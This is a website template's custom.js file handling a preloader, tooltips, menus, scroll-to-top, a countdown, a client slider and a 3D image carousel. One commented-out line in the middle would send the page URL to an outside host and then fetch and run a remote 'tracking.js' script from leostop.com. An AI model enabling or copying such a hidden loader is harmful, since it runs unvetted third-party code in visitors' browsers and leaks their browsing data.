/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);


	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});


	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});


	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });

// function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } });

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });

    new Swiper('.clients-slider', {
      speed: 400,
      loop: true,
      autoplay: {
        delay: 5000,
        disableOnInteraction: false
      },
      slidesPerView: 'auto',
      pagination: {
        el: '.swiper-pagination',
        type: 'bullets',
        clickable: true
      },
      breakpoints: {
        320: {
          slidesPerView: 2,
          spaceBetween: 40
        },
        480: {
          slidesPerView: 3,
          spaceBetween: 60
        },
        640: {
          slidesPerView: 4,
          spaceBetween: 80
        },
        992: {
          slidesPerView: 6,
          spaceBetween: 120
        }
      }
    });

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

/*

3D Carousel images gallery. inspired from David DeSandro's tutorial (https://3dtransforms.desandro.com/)

*/

window.addEventListener('load', function() {
  carouselRUN();
}, false);

function carouselRUN() {
  var carousel = document.getElementById("carousel");
  var scene = document.getElementById("scene");
  var carousel_items_Arrey = document.getElementsByClassName("carousel_item");
  var carousel_btn = document.getElementById("carousel_btn");
  var n = carousel_items_Arrey.length;
  var curr_carousel_items_Arrey = 0;
  var theta = Math.PI * 2 / n;
  var interval = null;
  var autoCarousel = carousel.dataset.auto;

  setupCarousel(n, parseFloat(getComputedStyle(carousel_items_Arrey[0]).width));
  window.addEventListener('resize', function() {
      clearInterval(interval);
      setupCarousel(n, parseFloat(getComputedStyle(carousel_items_Arrey[0]).width));
  }, false);
  setupNavigation();



  function setupCarousel(n, width) {
      var apothem = width / (2 * Math.tan(Math.PI / n));
      scene.style.transformOrigin = `50% 50% ${- apothem}px`;

      for (i = 1; i < n; i++) {
          carousel_items_Arrey[i].style.transformOrigin = `50% 50% ${- apothem}px`;
          carousel_items_Arrey[i].style.transform = `rotateY(${i * theta}rad)`;
      }

      if (autoCarousel === "true") {
          setCarouselInterval();
      }
  }

  function setCarouselInterval() {
      interval = setInterval(function() {
          curr_carousel_items_Arrey++;
          scene.style.transform = `rotateY(${(curr_carousel_items_Arrey) * -theta}rad)`;
      }, 3000);
  }

  function setupNavigation() {
      carousel_btn.addEventListener('click', function(e) {
          e.stopPropagation();
          var target = e.target;

          if (target.classList.contains('next')) {
              curr_carousel_items_Arrey++;
          } else if (target.classList.contains('prev')) {
              curr_carousel_items_Arrey--;
          }
          clearInterval(interval);
          scene.style.transform = `rotateY(${curr_carousel_items_Arrey * -theta}rad)`;

          if (autoCarousel === "true") {
              setTimeout(setCarouselInterval(), 3000);
          }
      }, true);
  }
}
